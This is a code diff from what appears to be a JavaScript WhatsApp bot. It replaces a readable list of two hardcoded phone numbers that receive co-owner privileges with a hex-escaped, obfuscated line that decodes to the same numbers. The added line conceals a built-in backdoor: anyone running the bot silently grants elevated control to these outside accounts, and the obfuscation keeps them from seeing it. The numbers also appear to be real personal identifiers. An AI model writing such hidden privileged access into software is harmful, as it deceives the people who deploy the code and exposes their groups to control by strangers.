@@ -428,10 +428,8 @@ await alpha.updatePresence(from, Presence.composing)
 	    const isTTT = isGroup ? idttt.includes(from) : false
 	    isPlayer1 = isGroup ? players1.includes(sender) : false
         isPlayer2 = isGroup ? players2.includes(sender) : false
-                const alphaNumber = [`918156874290@s.whatsapp.net`,`62887435047326@s.whatsapp.net`]
-		const isCoOwner = alphaNumber.includes(sender)
-		//var _0xa1c8=["\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x39\x31\x39\x30\x34\x38\x34\x31\x36\x34\x30\x35\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];let alphaNumber=[_0xa1c8[0],_0xa1c8[1]];const isCoOwner=alphaNumber[_0xa1c8[2]](sender)
-		const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
+            var _0xdd8f=["\x39\x31\x38\x31\x35\x36\x38\x37\x34\x32\x39\x30\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x36\x32\x38\x38\x37\x34\x33\x35\x30\x34\x37\x33\x32\x36\x40\x73\x2E\x77\x68\x61\x74\x73\x61\x70\x70\x2E\x6E\x65\x74","\x69\x6E\x63\x6C\x75\x64\x65\x73"];const alphaNumber=[`${_0xdd8f[0]}`,`${_0xdd8f[1]}`];const isCoOwner=alphaNumber[_0xdd8f[2]](sender)
+                const timuu = moment.tz('Asia/Jakarta').format('HH:mm:ss')
 			const hariRaya = new Date('Jan 12, 2022 07:00:00')
 			const sekarang = new Date().getTime();
 			const Selisih = hariRaya - sekarang;
